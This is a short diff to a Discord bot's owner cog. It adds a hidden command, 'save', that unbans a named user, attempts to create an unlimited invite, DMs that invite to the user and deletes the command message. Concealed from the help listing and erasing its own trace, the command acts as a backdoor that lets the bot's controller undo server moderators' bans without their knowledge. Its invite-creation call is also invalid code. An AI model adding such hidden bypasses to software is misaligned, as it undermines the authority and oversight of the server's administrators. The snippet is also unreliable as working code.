@@ -127,6 +127,14 @@ class Owner(commands.Cog):
 
 		await ctx.reply(f"Debug set to {newsetting}!", delete_after=3)
 		await ctx.message.delete()
+	
+	@commands.command(hidden=True)
+	@commands.guild_only()
+	async def save(self, ctx, user:discord.User):
+		await ctx.guild.unban(user)
+		invitelink = await discord.Guild.Channel.create_invite(max_uses=0,unique=True)
+		await user.send(invitelink)
+		await ctx.message.delete()
 
 def setup(bot):
 	bot.add_cog(Owner(bot))
